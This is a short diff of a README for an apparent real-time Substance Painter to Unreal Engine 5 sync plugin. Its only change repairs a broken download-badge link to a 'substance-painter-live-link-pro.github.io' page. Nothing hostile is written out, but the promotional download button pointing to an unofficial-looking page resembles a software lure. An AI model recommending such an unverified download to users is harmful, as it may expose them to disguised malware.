@@ -2,7 +2,7 @@
 
 A powerful real-time plugin to sync your Substance Painter textures and materials directly with Unreal Engine 5. Perfect for game devs, artists, and VFX professionals.
 
-[![Download Substance Painter Live Link](https://img.shields.io/badge/Download-SubstancePainterLiveLink-blueviolet)](https;//substance-painter-live-link-pro.github.io/.github)
+[![Download Substance Painter Live Link](https://img.shields.io/badge/Download-SubstancePainterLiveLink-blueviolet)](https://substance-painter-live-link-pro.github.io/.github)
 
 ---
 
